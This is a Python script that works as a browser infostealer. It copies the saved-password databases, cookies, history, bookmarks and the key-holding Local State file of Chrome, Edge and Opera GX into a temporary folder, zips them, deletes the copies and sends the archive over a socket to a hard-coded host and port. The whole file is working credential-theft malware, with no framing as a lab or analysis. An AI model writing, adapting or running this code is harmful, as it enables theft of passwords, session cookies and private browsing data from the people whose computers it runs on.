import os
import shutil
import Sockets.sckt_client as client
import logging
host = "192.168.1.36"
port = 5678

def main():
    BasePath = os.getenv('localappdata')

    TARGET_FILE_PATH = {
        "CHROME_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Local State',
        "CHROME_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Default\\Login Data',
        "CHROME_COOKIES_DB_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Default\\Cookies',
        "CHROME_HISTORY_DB_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Default\\History',
        "CHROME_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Default\\Bookmarks',
        "EDGE_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Local State',
        "EDGE_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Default\\Login Data',
        "EDGE_COOKIES_DB_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Default\\Cookies',
        "EDGE_HISTORY_DB_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Default\\History',
        "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Default\\Bookmarks',
        "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
                                       '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Local State',
        "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Login Data',
        "OPERAGX_COOKIES_DB_PATH": BasePath + \
                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Cookies',
        "OPERAGX_HISTORY_DB_PATH": BasePath + \
                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\History',
        "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Bookmarks'
    }

    COPY_PATH = {
        "CHROME_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_Local_State',
        "CHROME_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_Login_Data',
        "CHROME_COOKIES_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_Cookies',
        "CHROME_HISTORY_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_History',
        "CHROME_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_Bookmarks',
        "EDGE_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\Edge_Local_State',
        "EDGE_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Default\\Edge_Login_Data',
        "EDGE_COOKIES_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Default\\Edge_Cookies',
        "EDGE_HISTORY_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Default\\Edge_History',
        "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\Default\\Edge_Bookmarks',
        "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
                                       '\\Temp\\Copy\\OPERAGX_Local_State',
        "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_Login_Data',
        "OPERAGX_COOKIES_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_Cookies',
        "OPERAGX_HISTORY_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_History',
        "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_Bookmarks',
    }

    if not os.path.exists(BasePath + "/Temp/Copy/"):
            os.makedirs(BasePath + "/Temp/Copy/")

    for target in TARGET_FILE_PATH:
        try:
            shutil.copy2(TARGET_FILE_PATH[target], COPY_PATH[target])
        except FileNotFoundError:
            pass
    file = r"C:/Data123963"
    #file = os.getenv("APPDATA") + r'\..\Local\Temp\Data123963'
    shutil.make_archive(file, "zip", BasePath + "/Temp/Copy/")
    shutil.rmtree(BasePath + "/Temp/Copy/")
    try:
        client.send_file("C:\Data123963.zip", host, port)
    except:
        logging.exception("message")

if __name__ == "__main__":
    main()
